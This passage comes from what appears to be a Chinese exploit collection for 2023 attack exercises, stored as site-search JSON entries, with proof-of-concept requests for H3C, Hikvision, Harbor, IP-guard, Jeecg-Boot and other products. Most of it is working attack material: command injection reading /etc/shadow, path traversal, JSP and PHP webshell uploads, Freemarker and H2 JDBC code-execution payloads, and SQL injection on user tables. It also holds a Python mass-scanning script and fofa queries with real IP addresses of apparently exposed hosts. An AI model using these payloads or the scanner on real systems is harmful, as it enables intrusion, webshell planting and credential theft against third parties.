CMD=DelL2tpLNSList\u0026GO=vpn_l2tp_session.asp\u0026param=1; $(ls\u003e/www/test); 访问 http://xxx/test ","date":"2023-12-08","objectID":"/h3c-magic-b1stv100r012-rce/:1:0","tags":["2023hw漏洞"],"title":"H3C Magic B1STV100R012 RCE","uri":"/h3c-magic-b1stv100r012-rce/"},{"categories":["2023hw"],"content":"## fofa\rapp=\"H3C-GR-1200W\" http://117.27.77.48:8989 http://121.207.148.27:8989 https://221.7.157.167:8989 ","date":"2023-12-08","objectID":"/h3c-minigrw-web-%E8%B7%AF%E7%94%B1%E5%99%A8-sys_passwd_prompt-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"H3C MiniGRW Web 路由器 sys_passwd_prompt 信息泄漏漏洞","uri":"/h3c-minigrw-web-%E8%B7%AF%E7%94%B1%E5%99%A8-sys_passwd_prompt-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞详情 右键源代码 搜索sys_passwd_prompt ","date":"2023-12-08","objectID":"/h3c-minigrw-web-%E8%B7%AF%E7%94%B1%E5%99%A8-sys_passwd_prompt-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"H3C MiniGRW Web 路由器 sys_passwd_prompt 信息泄漏漏洞","uri":"/h3c-minigrw-web-%E8%B7%AF%E7%94%B1%E5%99%A8-sys_passwd_prompt-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"H3C网络管理系统任意文件读取漏洞 ","date":"2023-12-08","objectID":"/h3c%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"H3C网络管理系统任意文件读取漏洞","uri":"/h3c%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa body=\"webui/js/jquerylib/jquery-1.7.2.min.js\" ","date":"2023-12-08","objectID":"/h3c%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"H3C网络管理系统任意文件读取漏洞","uri":"/h3c%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc GET /webui/?file_name=../../../../../etc/passwd\u0026g=sys_dia_data_down HTTP/1.1 ","date":"2023-12-08","objectID":"/h3c%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"H3C网络管理系统任意文件读取漏洞","uri":"/h3c%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rapp=\"HARBOR\" ","date":"2023-12-08","objectID":"/harbor%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9Ecve-2022-46463/:0:0","tags":["2023hw"],"title":"Harbor未授权访问漏洞(cve-2022-46463)","uri":"/harbor%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9Ecve-2022-46463/"},{"categories":["2023hw"],"content":"poc GET /api/v2.0/search?q=/ HTTP/1.1 Host: 122.114.245.33 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/harbor%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9Ecve-2022-46463/:1:0","tags":["2023hw"],"title":"Harbor未授权访问漏洞(cve-2022-46463)","uri":"/harbor%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9Ecve-2022-46463/"},{"categories":["2023hw"],"content":"# HIKVISION iVMS-8700综合安防管理平台 download 任意文件下载漏洞\r","date":"2023-12-08","objectID":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"HIKVISION iVMS-8700综合安防管理平台 download 任意文件下载漏洞","uri":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞描述 HIKVISION iVMS-8700综合安防管理平台存在任意文件读取漏洞，攻击者通过发送特定的请求包可以读取服务器中的敏感文件获取服务器信息 ","date":"2023-12-08","objectID":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"HIKVISION iVMS-8700综合安防管理平台 download 任意文件下载漏洞","uri":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞影响 HIKVISION iVMS-8700综合安防管理平台 ","date":"2023-12-08","objectID":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw"],"title":"HIKVISION iVMS-8700综合安防管理平台 download 任意文件下载漏洞","uri":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"网络测绘 icon_hash=\"-911494769\" ","date":"2023-12-08","objectID":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw"],"title":"HIKVISION iVMS-8700综合安防管理平台 download 任意文件下载漏洞","uri":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"漏洞复现 登录页面 验证POC， token 为 Url md5+ /eps/api/triggerSnapshot/download?token=xxx\u0026fileUrl=file:///C:/windows/win.ini\u0026fileName=1 ","date":"2023-12-08","objectID":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw"],"title":"HIKVISION iVMS-8700综合安防管理平台 download 任意文件下载漏洞","uri":"/hikvision-ivms-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-download-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"https://218.89.6.85:444/artemis/env\r/artemis-portal/artemis/env https://mp.weixin.qq.com/s/GzTO2k70_s3RwquQ1R-W_w ","date":"2023-12-08","objectID":"/hikvision-%E6%B5%B7%E5%BA%B7%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E7%B3%BB%E7%BB%9F-springboot-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"Hikvision 海康综合安防管理平台系统 springboot 信息泄露漏洞","uri":"/hikvision-%E6%B5%B7%E5%BA%B7%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E7%B3%BB%E7%BB%9F-springboot-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa app=\"HIKVISION-iSecure-Center\" ","date":"2023-12-08","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"HiKVISION 综合安防管理平台 任意文件上传漏洞","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"HiKVISION 综合安防管理平台 report 任意文件上传漏洞 POST /svm/api/external/report HTTP/1.1 Host: 10.10.10.10 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a ------WebKitFormBoundary9PggsiM755PLa54a Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp\" Content-Type: application/zip \u003c%jsp的马%\u003e ------WebKitFormBoundary9PggsiM755PLa54a-- 马儿路径：/portal/ui/login/..;/..;/new.jsp ","date":"2023-12-08","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"HiKVISION 综合安防管理平台 任意文件上传漏洞","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"HiKVISION 综合安防管理平台 files 任意文件上传漏洞 POST /center/api/files;.html HTTP/1.1 Host: 10.10.10.10 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a ------WebKitFormBoundary9PggsiM755PLa54a Content-Disposition: form-data; name=\"file\"; filename=\"../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp\" Content-Type: application/zip \u003c%jsp的马%\u003e ------WebKitFormBoundary9PggsiM755PLa54a-- ","date":"2023-12-08","objectID":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"HiKVISION 综合安防管理平台 任意文件上传漏洞","uri":"/hikvision-%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"Hytec Inter HWL-2511-SS popen.cgi命令注入漏洞 ","date":"2023-12-08","objectID":"/hytec-inter-hwl-2511-ss-popen.cgi%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"Hytec Inter HWL-2511-SS popen.cgi命令注入漏洞","uri":"/hytec-inter-hwl-2511-ss-popen.cgi%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa title=\"index\" \u0026\u0026 header=\"lighttpd/1.4.30\" ","date":"2023-12-08","objectID":"/hytec-inter-hwl-2511-ss-popen.cgi%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"Hytec Inter HWL-2511-SS popen.cgi命令注入漏洞","uri":"/hytec-inter-hwl-2511-ss-popen.cgi%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc /cgi-bin/popen.cgi?command=ping%20-c%204%201.1.1.1;cat%20/etc/shadow\u0026v=0.1303033443137921 ","date":"2023-12-08","objectID":"/hytec-inter-hwl-2511-ss-popen.cgi%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:1","tags":["2023hw漏洞"],"title":"Hytec Inter HWL-2511-SS popen.cgi命令注入漏洞","uri":"/hytec-inter-hwl-2511-ss-popen.cgi%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"I Doc View任意文件上传漏洞 I DOC VIEW是一个在线的文档查看器，其中的/html/2word接口因为处理不当，导致可以远程读取任意文件，通过这个接口导致服务器下载恶意的JSP进行解析，从而RCE。 ","date":"2023-12-08","objectID":"/i-doc-view%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"I Doc View任意文件上传漏洞","uri":"/i-doc-view%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"POC构造 流程：携带恶意link[href]的html -\u003e 远程获取 -\u003e 解析出href -\u003e 远程获取恶意文件 poc.html \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003ctitle\u003etest\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003clink href=\"/..\\..\\..\\docview\\poc.jsp\"\u003e \u003c/body\u003e \u003c/html\u003e 然后构造 ..\\..\\..\\docview\\poc.jsp 这个是文件 ","date":"2023-12-08","objectID":"/i-doc-view%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"I Doc View任意文件上传漏洞","uri":"/i-doc-view%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞分析 https://mp.weixin.qq.com/s/lDqhDnZGXoRyp2IolQ2odg https://mp.weixin.qq.com/s/mD4EcVmJ9QPmmMLh6KrZ0g ","date":"2023-12-08","objectID":"/i-doc-view%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"I Doc View任意文件上传漏洞","uri":"/i-doc-view%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"IP-guard WebServer 远程命令执行漏洞 IP-guard是由溢信科技股份有限公司开发的一款终端安全管理软件，旨在帮助企业保护终端设备安全、数据安全、管理网络使用和简化IT系统管理。 ","date":"2023-12-08","objectID":"/ip-guard-webserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"IP-guard WebServer 远程命令执行漏洞","uri":"/ip-guard-webserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"影响版本 \u003c IP-guard WebServer 4.81.0307.0 ","date":"2023-12-08","objectID":"/ip-guard-webserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"IP-guard WebServer 远程命令执行漏洞","uri":"/ip-guard-webserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa \"IP-guard\" \u0026\u0026 icon_hash=\"2030860561\" ","date":"2023-12-08","objectID":"/ip-guard-webserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"IP-guard WebServer 远程命令执行漏洞","uri":"/ip-guard-webserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc /ipg/static/appr/lib/flexpaper/php/view.php?doc=11.jpg\u0026format=swf\u0026isSplit=true\u0026page=||ping%20dnslog ","date":"2023-12-08","objectID":"/ip-guard-webserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":["2023hw漏洞"],"title":"IP-guard WebServer 远程命令执行漏洞","uri":"/ip-guard-webserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"写php GET /ipg/static/appr/lib/flexpaper/php/view.php?doc=1.jpg\u0026format=swf\u0026isSplit=true\u0026page=||echo+^\u003c?php+@mb_eregi_replace('.*',$_POST['a'],'','ee');?^\u003e+\u003e1.php HTTP/1.1 Host: your-ip User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 ","date":"2023-12-08","objectID":"/ip-guard-webserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":["2023hw漏洞"],"title":"IP-guard WebServer 远程命令执行漏洞","uri":"/ip-guard-webserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 ","date":"2023-12-08","objectID":"/ip-guard-webserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:6:0","tags":["2023hw漏洞"],"title":"IP-guard WebServer 远程命令执行漏洞","uri":"/ip-guard-webserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"Python脚本 #!/usr/bin/python3 # -*- coding:utf-8 -*- # author:MDSEC # from:https://github.com/MD-SEC/MDPOCS # fofa:\"IP-guard\" \u0026\u0026 icon_hash=\"2030860561\" # import sys import requests import csv import urllib3 import hashlib from concurrent.futures import ThreadPoolExecutor import time if len(sys.argv) != 2: print( '+----------------------------------------------------------------------------------------------------------+') print( '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS +') print( '+-------------------------------------------------------------------------------------------------- -------+') print( '+ USE: python3 \u003cfilename\u003e \u003chosts.txt\u003e +') print( '+ EXP: python3 Ip_Guard_Webserver_View_Rce_Poc.py url.txt +') print( '+-------------------------------------------------------------------------------------------------- --------+') sys.exit() proxysdata = { 'http': '127.0.0.1:8080' } def poc(host): if \"http\" in host: url = host else: url =\"http://\"+host host1=url.replace(\"http://\",\"\") host2=host1.replace(\"https://\",\"\") headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Host\":\"%s\" % host2 } vulurl = url + \"/ipg/static/appr/lib/flexpaper/php/view.php?doc=11.jpg\u0026format=swf\u0026isSplit=true\u0026page=||ping%20www.baidu.com\" try: start_time = time.time() r = requests.get(vulurl, headers=headers) end_time = time.time() response_time = end_time - start_time if r.status_code==200 and response_time \u003e2 and response_time\u003c6 : print(host+\" :一定能打\") elif r.status_code==200: print(host+\" :大概率能打\") else: print(host+\" :不能打\") except: return 0 print (host+\":false\") if __name__ == '__main__': file = sys.argv[1] data = open(file) reader = csv.reader(data) with ThreadPoolExecutor(50) as pool: for row in reader: pool.submit(poc, row[0]) ","date":"2023-12-08","objectID":"/ip-guard-webserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:7:0","tags":["2023hw漏洞"],"title":"IP-guard WebServer 远程命令执行漏洞","uri":"/ip-guard-webserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"JAVA Public CMS 后台RCE漏洞 下载地址：https://github.com/sanluan/PublicCMS/ ","date":"2023-12-08","objectID":"/java-public-cms-%E5%90%8E%E5%8F%B0rce%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"JAVA Public CMS 后台RCE漏洞","uri":"/java-public-cms-%E5%90%8E%E5%8F%B0rce%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"漏洞复现 ","date":"2023-12-08","objectID":"/java-public-cms-%E5%90%8E%E5%8F%B0rce%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"JAVA Public CMS 后台RCE漏洞","uri":"/java-public-cms-%E5%90%8E%E5%8F%B0rce%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"环境搭建和复现 https://mp.weixin.qq.com/s/MHNVFo6EK8CZtelMaGOBxA ","date":"2023-12-08","objectID":"/java-public-cms-%E5%90%8E%E5%8F%B0rce%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"JAVA Public CMS 后台RCE漏洞","uri":"/java-public-cms-%E5%90%8E%E5%8F%B0rce%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rPOST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 {“sql”:\"\u003c#assign ex=\"freemarker.template.utility.Execute\"?new()\u003e${ex(\"命令\")}\"} ![image](https://s1.ax1x.com/2023/08/17/pPlXhSU.jpg) {“sql”:“select ‘\u003c!DOCTYPE html\u003e\u003chtml lang=\"en\"\u003e\u003cmeta charset=\"UTF-8\"\u003e\u003c#assign ex=\"freemarker.template.utility.Execute\"?new()\u003e${ex(\"ping baidu.com\")}Hello!\u003clink href=\"/css/main.css\" rel=\"stylesheet\"\u003e\u003ch2 class=\"hello-title\"\u003eHello!\u003cscript src=\"/js/main.js\"\u003e’”} POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1 Host: 47.115.200.176:9005 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/json Accept-Encoding: gzip Content-Length: 100 {“sql”:“select ‘\u003c#assign value=\"freemarker.template.utility.Execute\"?new()\u003e${value(\"whoami\")}’”} ## h2 POST /jeecg-boot/jmreport/testConnection HTTP/1.1 Host: 192.168.90.1:3100 Content-Length: 367 Accept: application/json, text/plain, / User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Content-Type: application/json;charset=UTF-8 Origin: http://192.168.90.1:3100 Referer: http://192.168.90.1:3100/login?redirect=/dashboard/analysis Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close { “id”: “1”, “code”: “dataSource1”, “dbType”: “H2”, “dbDriver”: “org.h2.Driver”, “dbUrl”: “jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\u000A\\u0009java.lang.Runtime.getRuntime().exec(‘whoami’)\\u000A$$”, “dbName”: “test”, “dbUsername”: “sa”, “dbPassword”: “”, “connectTimes”: 5 } https://c0olw.github.io/2023/08/15/JeecgBoot-SSTI%E4%BB%A5%E5%8F%8AJDBC-RCE/ ","date":"2023-12-08","objectID":"/jeecg-boot-freemarker-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-rce-%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"Jeecg-Boot Freemarker 模板注入 RCE 漏洞","uri":"/jeecg-boot-freemarker-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-rce-%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"https://github.com/jeecgboot/jeecg-boot/issues?q=Injection\r","date":"2023-12-08","objectID":"/jeecgboot-getdictitemsbytable-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"jeecgboot getDictItemsByTable sql 注入漏洞","uri":"/jeecgboot-getdictitemsbytable-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"fofa app=\"JeecgBoot-企业级低代码平台\" ","date":"2023-12-08","objectID":"/jeecgboot-getdictitemsbytable-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"jeecgboot getDictItemsByTable sql 注入漏洞","uri":"/jeecgboot-getdictitemsbytable-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"exp GET /jeecg-boot/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js HTTP/1.1 Host: 101.132.151.120:3000 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip http://101.132.151.120:3000/jeecg-boot/sys/ng-alain/getDictItemsByTable/%27%20from%20%20jeecg_order_customer/%2A,%20%27/x.js 